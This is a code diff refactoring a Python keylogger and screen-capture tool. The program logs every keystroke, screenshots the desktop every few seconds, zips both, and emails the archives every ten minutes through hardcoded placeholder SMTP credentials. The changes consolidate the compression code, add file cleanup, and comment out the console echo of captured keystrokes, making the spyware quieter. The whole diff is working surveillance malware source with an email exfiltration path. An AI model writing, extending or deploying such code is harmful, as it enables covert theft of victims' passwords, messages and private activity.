@@ -7,7 +7,8 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from pathlib import Path
 from threading import Thread, Timer
-from zipfile import ZipFile
+from typing import Literal
+from zipfile import ZIP_DEFLATED, ZipFile
 
 import keyboard
 from keyboard import KeyboardEvent
@@ -19,21 +20,37 @@ from mss import mss
 # ensure that access for third-party applications using
 # email and password authentication is enabled.
 
-PIC_INTERVAL = 5
+# =================================
+PIC_INTERVAL = 5  # seconds
 PIC_DEST = Path("./pics").resolve()
 PIC_DEST_SENT = PIC_DEST / "sent"
 PIC_DEST_ZIP = PIC_DEST / "zip"
+# =================================
 REPORT_DEST = Path("./reports").resolve()
 REPORT_DEST_SENT = REPORT_DEST / "sent"
 REPORT_DEST_ZIP = REPORT_DEST / "zip"
 REPORT_INTERVAL = 60  # seconds
+# =================================
 EMAIL_SEND_INTERVAL = 600  # 10 minutes
 EMAIL_ADDRESS = "user@example.com"
 EMAIL_PASSWORD = "password"
 
 
-def prepare():
-    for p in (PIC_DEST_SENT, PIC_DEST_ZIP, REPORT_DEST_SENT, REPORT_DEST_ZIP):
+def clean_dir(dir: Path):
+    for file in dir.iterdir():
+        if file.is_file():
+            file.unlink(missing_ok=True)
+
+
+def clean_dirs(dirs: list[Path]):
+    for dir in dirs:
+        clean_dir(dir)
+
+
+def create_dirs(files: tuple[Path, ...] | None = None):
+    if not files:
+        files = (PIC_DEST_SENT, PIC_DEST_ZIP, REPORT_DEST_SENT, REPORT_DEST_ZIP)
+    for p in files:
         p.mkdir(exist_ok=True, parents=True)
 
 
@@ -87,56 +104,48 @@ def sendmail(
         )
 
 
-def compress(files: list[Path], filename: Path | str, zip_dest: Path) -> Path:
+def compress(
+    files: list[Path], filename: Path | str, zip_dest: Path, compress_level: int = 9
+) -> Path:
     zip_path = zip_dest / filename
-    with ZipFile(zip_path, "w") as zip:
+    with ZipFile(zip_path, "w", ZIP_DEFLATED, compresslevel=compress_level) as zipf:
         for file in files:
-            zip.write(file, arcname=file.name)
+            if file.is_file():
+                zipf.write(file, arcname=file.name)
     return zip_path
 
 
-def compress_images(img_src: Path, sent_dest: Path, zip_dest: Path) -> Path:
-    img_ext = ".png"
-    imgs = [
-        file
-        for file in img_src.iterdir()
-        if file.is_file() and file.suffix.lower() == img_ext
+def compress_files(
+    src: Path,
+    sent_dest: Path,
+    zip_dest: Path,
+    type: Literal["img", "report"],
+    ext: Literal[".png", ".txt"],
+) -> Path:
+    files = [
+        file for file in src.iterdir() if file.is_file() and file.suffix.lower() == ext
     ]
-
-    filename = f"img-zip-{datetime.now().strftime('%Y-%m-%d-%H%M%S')}.zip"
-    zip = compress(imgs, filename, zip_dest)
-    for file in imgs:
+    filename = f"{type}-zip-{datetime.now().strftime('%Y-%m-%d-%H%M%S')}.zip"
+    zip = compress(files, filename, zip_dest)
+    for file in files:
         shutil.move(file, sent_dest / file.name)
     return zip
 
 
-def compress_reports(reports: Path, sent_dest: Path, zip_dest: Path) -> Path:
-    report_ext = ".txt"
-    imgs = [
-        file
-        for file in reports.iterdir()
-        if file.is_file() and file.suffix.lower() == report_ext
-    ]
-
-    filename = f"report-zip-{datetime.now().strftime('%Y-%m-%d-%H%M%S')}.zip"
-    zip = compress(imgs, filename, zip_dest)
-    for file in imgs:
-        shutil.move(file, sent_dest / file.name)
-    return zip
-
-
-def start_email(interval: int):
+def start_email(interval: int, email: str, password: str):
     print(
         f"[*] {datetime.now()} - email thread started, waiting {interval}s between sends"
     )
     while True:
         try:
             time.sleep(interval)
-            img_zip = compress_images(PIC_DEST, PIC_DEST_SENT, PIC_DEST_ZIP)
-            report_zip = compress_reports(
-                REPORT_DEST, REPORT_DEST_SENT, REPORT_DEST_ZIP
+            img_zip = compress_files(
+                PIC_DEST, PIC_DEST_SENT, PIC_DEST_ZIP, "img", ".png"
             )
-            sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, "LOG", [img_zip, report_zip])
+            report_zip = compress_files(
+                REPORT_DEST, REPORT_DEST_SENT, REPORT_DEST_ZIP, "report", ".txt"
+            )
+            sendmail(email, password, "LOG", [img_zip, report_zip])
         except Exception as e:
             print(f"[-] {datetime.now()} - error trying to send email: {e}")
 
@@ -209,7 +218,7 @@ class Keylogger:
             self.update_filename()
             self.report_to_file()
             # if you don't want to print in the console, comment below line
-            print(f"[+] [{self.filename}] - {self.log}")
+            # print(f"[+] [{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
         self.log = ""
         timer = Timer(interval=self.interval, function=self.report)
@@ -264,7 +273,7 @@ class ScreenCapture:
 
 
 if __name__ == "__main__":
-    prepare()
+    create_dirs()
 
     keylogger = Keylogger(REPORT_DEST, interval=REPORT_INTERVAL)
     sc = ScreenCapture(PIC_DEST, PIC_INTERVAL)
@@ -272,7 +281,9 @@ if __name__ == "__main__":
     keylogger_thread = Thread(target=keylogger.start, name="KeyloggerThread")
     screen_thread = Thread(target=sc.start, name="ScreenCaptureThread")
     email_thread = Thread(
-        target=start_email, name="SendEmailThread", args=[EMAIL_SEND_INTERVAL]
+        target=start_email,
+        name="SendEmailThread",
+        args=[EMAIL_SEND_INTERVAL, EMAIL_ADDRESS, EMAIL_PASSWORD],
     )
 
     keylogger_thread.start()
